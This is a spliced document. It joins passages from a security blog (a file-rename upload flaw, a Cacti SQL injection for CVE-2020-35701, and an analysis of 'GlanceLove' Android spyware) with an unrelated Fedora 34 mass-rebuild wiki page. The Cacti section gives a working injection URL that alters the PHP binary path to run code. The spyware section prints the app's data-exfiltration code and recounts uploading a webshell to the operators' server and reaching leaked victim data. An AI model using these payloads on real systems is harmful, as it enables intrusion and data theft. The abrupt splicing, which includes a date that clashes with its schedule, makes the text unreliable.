        $x = rename($i['dir'].'/'.$i['name'], $i['dir'].'/'.$newname);
        if ($x === false) {
            $error = true;
        } else {
            // Rename the database entry
            $images[$id]['name'] = $newname;
            set_array_option('custom_includes_files_images', $images);
        }
    }

    if ($error) {
        echo json_encode(array('error' => 1, 'msg' => _('Could not rename file. Check file permissions.')));
    } else {
        echo json_encode(array('error' => 0, 'msg' => _('Renamed successfully')));
    }
}
```

As you can see, it takes the id of the old image, the name of the new image, and then renaming it.
There is no file name is validation at all, which allows the attacker not only to directory traversal but also to rename the file with any extension we want.
Which as a result, the attacker can upload arbitrary files.

## [CVE-2020-35701 – Cacti 1.2.0 – 1.2.16 SQL Injection](https://asaf.me/2020/12/15/cacti-1-2-0-to-1-2-16-sql-injection/)

This one is pretty straightforward and was found pretty quick

An SQL injection in the latest version of cacti.

In order to trigger the vulnerability you just need to enter this url: cacti/data\_debug.php?action=ajax\_hosts&site\_id=11SQLInjection

Because of how PHP behaves, the check:

```
if (get_request_var('site_id') > 0) {
   $sql_where = 'site_id = ' . get_request_var('site_id');
}
```

will pass when the parameter starts with a number, and in the end the system will try to execute the following query:

```
SELECT h1.*
FROM host AS h1
         INNER JOIN (SELECT DISTINCT id
                     FROM (SELECT h.*, uap0.user_id AS user0, uap1.user_id AS user1, uap2.user_id AS user2
                           FROM host AS h
                                    LEFT JOIN graph_local AS gl ON h.id = gl.host_id
                                    LEFT JOIN graph_templates_graph AS gtg ON gl.id = gtg.local_graph_id
                                    LEFT JOIN graph_templates AS gt ON gt.id = gl.graph_template_id
                                    LEFT JOIN host_template AS ht ON h.host_template_id = ht.id
                                    LEFT JOIN user_auth_perms AS uap0
                                              ON (gl.id = uap0.item_id AND uap0.type = 1 AND uap0.user_id = 1)
                                    LEFT JOIN user_auth_perms AS uap1
                                              ON (gl.host_id = uap1.item_id AND uap1.type = 3 AND uap1.user_id = 1)
                                    LEFT JOIN user_auth_perms AS uap2
                                              ON (gl.graph_template_id = uap2.item_id AND uap2.type = 4 AND
                                                  uap2.user_id = 1)
                           WHERE site_id = <strong>11sql_injection</strong>) AS rs1) AS rs2 ON rs2.id = h1.id;
select 1 # AND hostname LIKE '%hostname%' OR description LIKE '%description%' OR notes LIKE '%notes%' AND h.disabled=""
HAVING (user0 IS NULL OR (user1 IS NULL OR user2 IS NULL)) ) AS rs1 ) AS rs2
ON <a rel="noreferrer noopener" href="http://rs2.id/" target="_blank">rs2.id</a>=<a rel="noreferrer noopener" href="http://h1.id/" target="_blank">h1.id</a>
ORDER BY description LIMIT 30
```

If we will execute something like this:

```
cacti/data_debug.php?action=ajax_hosts&amp;site_id=11) AS rs1   ) AS rs2   ON rs2.id=h1.id;update settings set value='php -r "file_put_contents(\'/tmp/a\',\'aaa\'); "' where name='path_php_binary';-- -
```

We will manage to execute code when we will visit /cacti/host.php?action=reindex

## [Attacking the attackers](https://asaf.me/2018/07/23/attacking-the-attackers/)

## Introduction

One day evening while I was sitting on the couch I saw on the news that someone exposed a malicious Android application that some group of hackers built.

I just opened a random news website to check the application name – and find out its called “GlanceLove”.

## Getting a little bit deeper

After finding the apk and download it I decompiled it using [JDAX](https://github.com/skylot/jadx) and the first thing I did is to search for an “http” string (I assumed it uses HTTP protocol to leaking data).

The thing that pops immediately from the search was that the application used the “HttpURLConnection” class, which made me pretty sure that the application used a web server to leak the data, another thing is that I didn’t see is a string of the URL it should connect to, so I needed to read some code.

One of the functions used the “HttpURLConnection”  was called m7665a:

```
    public static String m7665a(String str, byte[] bArr) {
        String str2;
        Throwable th;
        HttpURLConnection httpURLConnection = null;
        try {
            HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str).openConnection();
            try {
                httpURLConnection2.setRequestMethod(f5386b);
                httpURLConnection2.setRequestProperty(f5387c, f5388d);
                httpURLConnection2.setUseCaches(false);
                httpURLConnection2.setDoInput(true);
                httpURLConnection2.setDoOutput(true);
                DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection2.getOutputStream());
                dataOutputStream.write(bArr);
                dataOutputStream.flush();
                dataOutputStream.close();
                ...
                ...
}
```

So this function received 2 parameters: str which is the URL, and bArr which is the data it sends to the server. We also can see that the request method defined in the f5386b variable and the request property defined in f5387c and f5388d:

```
private static final String f5386b = C1559l.m7683a(new C1552g[]{C1552g.P, C1552g.O, C1552g.S, C1552g.T});
private static final String f5387c = C1559l.m7683a(new C1552g[]{C1552g.C, C1552g.o, C1552g.n, C1552g.t, C1552g.e, C1552g.n, C1552g.t}).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.T, C1552g.y, C1552g.p, C1552g.e}));
private static final String f5388d = C1559l.m7683a(new C1552g[]{C1552g.a, C1552g.p, C1552g.p, C1552g.l, C1552g.i, C1552g.c, C1552g.a, C1552g.t, C1552g.i, C1552g.o, C1552g.n})M.concat("/x").concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.w, C1552g.w, C1552g.w})).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.f, C1552g.o, C1552g.r, C1552g.m})).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.u, C1552g.r, C1552g.l, C1552g.e, C1552g.n, C1552g.c, C1552g.o, C1552g.d, C1552g.e, C1552g.d}));

```

The attackers used [ProGuard](https://sourceforge.net/projects/proguard/) to obfuscate the strings and the functions names, which explain why I couldn’t find the URL string. Lucky me, you can see immediately what those strings contain:

```
private static final String f5386b = "POST"
private static final String f5387c = "Content-Type"
private static final String f5388d = "Application/x-www-form-urlencoded"
```

I checked which functions are using the m7665a function and the result was:

```
private static void m7672b(File file) {
    C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5198i)).trim();
}
public static String m7489b() {
    return f5199j + C1489a.m7487a() + f5201l;
}
public static String m7487a() {
    C1545b c1545b = new C1545b(f5203n.getFilesDir().getAbsolutePath(), f5202m);
    if (c1545b.exists()) {
        String str = new String(c1545b.m7647a());
        if (!(str == null || str.isEmpty())) {
            return str;
        }
    }
    return f5204o;
}
```

So m7672b called m7665a with the URL defined at m7489b, which after translation returns “HTTP://WWW.GLANCELOVE.COM/APPS/d/p/OP.PHP” (m7487a does something but in the end it returns the f5204o which contains the website URL)

So now I know the full URL (After I test it I realized it should be in lowercase) the application connects to and have a lot of strings:

```
public static final String f5190a = ".ZIP"
public static final String f5191b = ".DATA"
public static final String f5192c = ".APK"
public static final byte[] f5193d = "A".getBytes();
public static final byte[] f5194e = "B".getBytes();
public static final byte[] f5195f = "F".getBytes();
public static final byte[] f5196g = "CCC".getBytes();
public static final byte[] f5197h = "D".getBytes();
public static final byte[] f5198i = "E".getBytes();
public static final String f5199j = "HTTP://"
public static final String f5200k = "TCP://";
public static final String f5201l = "/APPS/d/p/OP.PHP"
public static final String f5202m = "IP.TXT"
private static Context f5203n = App.m7476a();
private static String f5204o = "WWW.GLANCELOVE.COM"
private static byte[] f5394b = "devId="
private static byte[] f5395c = "&op="
private static byte[] f5396d = "&fName="
private static byte[] f5397e = "&data="
private static String f5398f = "true"
```

So a common sense is that all I need to do is to send a POST request to the URL with the parameters devId, op, fName, and data.

```
private static byte[] m7671a(File file, byte[] bArr) {
    ...
    Object obj = new byte[(((((f5394b.length + a2.length) + f5396d.length) + a.length) + f5395c.length) + bArr.length)];
    ...
    System.arraycopy(bArr, 0, obj, (a.length + ((a2.length + f5394b.length) + f5396d.length)) + f5395c.length, bArr.length);
}
public static int m7668a(File file) {
    ...
    Object a = C1551f.m7671a(file, C1489a.f5196g);
    ...
}
private static void m7672b(File file) {
    C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5198i)).trim();
}
private static long m7674c(File file) {
        ...
        return Long.parseLong(C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5197h)).trim());
}
```

m7671a build the opId by the value which passed from the functions m7668a, m7672b and m7674c which use the values “CCC”, “E” and “D”, respectively.

I still had no idea what those values do, so I tried them all – I sent a POST request with the payload: devId=123123&op=CCC&fName=123&data=abc

And the response I got was 38, which is exactly the payload’s length I sent, so now I assumed I managed to upload my file somewhere, but I had no clue where is it in the server.

After a few educated guesses, I find out that the path is /apps/d/uploads/dev/123123/123!

![](https://asaf.me/wp-content/uploads/2018/07/files-133x300.jpg)

Game over. I uploaded a webshell and find out that this app has been installed in more than 500[!] cellphones and it leaked more than 10GB of data full of goods.

I had to think what can I do with think what can I do with that data – I’ll leave it for another post 🙂

## Goal

The goal is to rebuild every single Fedora package, regardless of
content, before the Fedora 34 Change Deadline.

## Driving Features

* [GNUToolchain](/wiki/Changes/GNUToolchain "Changes/GNUToolchain")
* [F34Boost175](/wiki/Changes/F34Boost175 "Changes/F34Boost175")
* [F34MingwEnvToolchainUpdate](/wiki/Changes/F34MingwEnvToolchainUpdate "Changes/F34MingwEnvToolchainUpdate")
* [golang1.16](/wiki/Changes/golang1.16 "Changes/golang1.16")
* [Remove\_make\_from\_BuildRoot](/wiki/Changes/Remove_make_from_BuildRoot "Changes/Remove make from BuildRoot")

## Schedule

Given the changes required for the above features and the given
schedules, Release Engineering will be ready to start scripted rebuilds
on Wednesday, Januar 20th. All automated rebuilds should be finished prior to the Feature Freeze.
Any clean-up manual rebuilds should be finished prior to the Beta Change Deadline.

### Remove make from BuildRoot

*koji block-group-pkg f34-rebuild build make*

## Scripts

Release Engineering has created two scripts. One is to initiate the builds, and the other is to query for items still needing to be built.

### Build Initiation

The rebuild [script](https://pagure.io/releng/blob/master/f/scripts/mass-rebuild.py) works in the following way:

```
 Generate a list of all packages in f34
 Loop through each package:
   Query if a build has already been attempted/completed since koji changes went live.
   If so, move to next package
   If not, check out git
   rpmdev-bumpspec
   fedpkg commit -cp
   fedpkg (background) build
   Move on to next package

```

Each step will have some error catching and logging so that people
can clean up the various failures for whatever reasons. The builds will
be background builds, which will allow other builds done to take higher
priority when a builder has a free slot. However, maintainers should
take care when doing this so that the background build won't take
'latest' precedent when it finishes. Asking rel-eng to kill the
scripted build will typically be enough.

### Build Tagging

Once the rebuild script has finished, another [script](https://pagure.io/releng/blob/master/f/scripts/mass-tag.py) will run to tag the builds into f34. This script will check that a newer build hasn't been done or started in f34 since the scripted rebuild was submitted. This will protect against the scripted rebuild overriding an even newer build done while the scripted rebuild was waiting in the background.

### Status Query

Release Engineering has developed a [script](https://pagure.io/releng/blob/master/f/scripts/need-rebuild.py) to query f34
and report on packages that have yet to be rebuilt. Results of these
queries will be delivered to various places, yet to be determined,
broken down by maintainer for easier discovery of work needed.

## Maintainer Actions

* Maintainers can help this effort by ensuring **rpmdev-bumpspec** correctly bumps your package's spec files.
* Maintainers should ensure that their packages currently build from source.
* Maintainers should ensure that there are no unwanted changes committed to git but not built yet.

## Frequently Asked Questions

### When will my own build "count" for the rebuild?

After the last piece needed for the mass rebuild a golang build was put into place, a build done by a maintainer will "count" toward the rebuild. 2020-01-20 10:00:00 is the UTC time that builds count from

### Will the rebuilds be ordered?

## Feedback

Questions/comments/concerns should be directed to [[1]](https://lists.fedoraproject.org/mailman/listinfo/devel), or #fedora-releng on freenode IRC.
